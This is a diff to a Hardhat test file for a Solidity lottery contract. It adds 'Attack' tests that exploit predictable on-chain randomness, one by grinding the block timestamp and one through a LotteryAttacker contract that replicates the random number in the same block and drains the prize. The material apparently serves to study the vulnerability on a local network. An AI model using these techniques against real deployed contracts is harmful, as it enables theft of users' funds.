@@ -1,8 +1,8 @@
 import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
 import { expect } from "chai";
-import { ethers } from "hardhat";
+import { ethers, network } from "hardhat";
 
-describe("LogicV1", function () {
+describe("LotteryV1", function () {
   // We define a fixture to reuse the same setup in every test.
   // We use loadFixture to run this setup once, snapshot that state,
   // and reset Hardhat Network to that snapshot in every test.
@@ -12,11 +12,14 @@ describe("LogicV1", function () {
     const Lottery = await ethers.getContractFactory("Lottery", deployer);
     const lottery = await Lottery.deploy();
 
-    return {lottery, deployer, user, attacker};
+    const LotteryAttacker = await ethers.getContractFactory("LotteryAttacker", attacker);
+    const lotteryAttacker = await LotteryAttacker.deploy(lottery.address);
+
+    return {lottery, lotteryAttacker, deployer, user, attacker};
   }
 
   describe("Test Lottery game", function () {
-    describe("With bets open", function() {
+    describe.skip("With bets open", function() {
       it("Should allow a user to place a bet", async () => {
         const { lottery, user } = await loadFixture(deployLotteryWithInitSupply);
 
@@ -45,7 +48,7 @@ describe("LogicV1", function () {
       });
     });
 
-    describe("With bets closed", function() {
+    describe.skip("With bets closed", function() {
       it("Should revert if a user place a bet", async () => {
         const { lottery, user } = await loadFixture(deployLotteryWithInitSupply);
 
@@ -100,6 +103,44 @@ describe("LogicV1", function () {
         await lottery.connect(user).withdrawPrize();
 
         await expect(lottery.connect(user).withdrawPrize()).to.be.revertedWith("Prize already taken");
+      });
+    });
+
+    describe("Attack", function() {
+      it.skip("Should miner guess winningNumber",async () => {
+        const { lottery, user, attacker } = await loadFixture(deployLotteryWithInitSupply);
+
+        await lottery.connect(user).placeBet(10, {value: ethers.utils.parseEther("10")});
+        await lottery.connect(attacker).placeBet(15, {value: ethers.utils.parseEther("10")});
+        await lottery.placeBet(20, {value: ethers.utils.parseEther("10")});
+
+        await network.provider.send("evm_setNextBlockTimestamp", [1681446601]);
+        var winningNumber = 0;
+        while (winningNumber != 15) {
+          await lottery.endLottery();
+          winningNumber = await lottery.winningNumber();
+        }
+        const beforeBalance = await ethers.provider.getBalance(attacker.address);
+        await lottery.connect(attacker).withdrawPrize();
+        const afterBalance = await ethers.provider.getBalance(attacker.address);
+
+        expect(afterBalance).to.be.gt(beforeBalance);
+      });
+
+      it("Should Replicate random logic within the same block", async () => {
+        const { lottery, lotteryAttacker, attacker } = await loadFixture(deployLotteryWithInitSupply);
+
+        await lotteryAttacker.attack({ value: ethers.utils.parseEther("10")});
+        await lottery.endLottery();
+
+        await network.provider.send("evm_mine");
+
+        console.log("Winning number: ", await lottery.winningNumber());
+        console.log("Attacker bid: ", await lottery.bets(lotteryAttacker.address));
+
+        console.log("Contract balance: ", await ethers.provider.getBalance(lottery.address));
+        await lotteryAttacker.withdraw();
+        console.log("Contract balance: ", await ethers.provider.getBalance(lottery.address));
       });
     });
   });
